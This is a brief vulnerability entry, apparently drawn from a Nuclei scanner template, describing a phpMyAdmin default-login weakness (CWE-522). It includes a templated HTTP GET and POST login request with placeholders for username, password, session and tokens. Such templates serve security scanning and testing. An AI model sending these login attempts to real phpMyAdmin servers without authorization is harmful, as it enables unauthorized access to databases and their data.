# Vulnerability: phpMyAdmin - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`phpmyadmin-default-login.yaml`)

## Description
phpMyAdmin contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /index.php HTTP/1.1
Host: {{Hostname}}

POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: phpMyAdmin={{token2}}; pma_lang=en

set_session={{session}}&pma_username={{user}}&pma_password={{password}}&server=1&route=%2F&token={{token}}
```

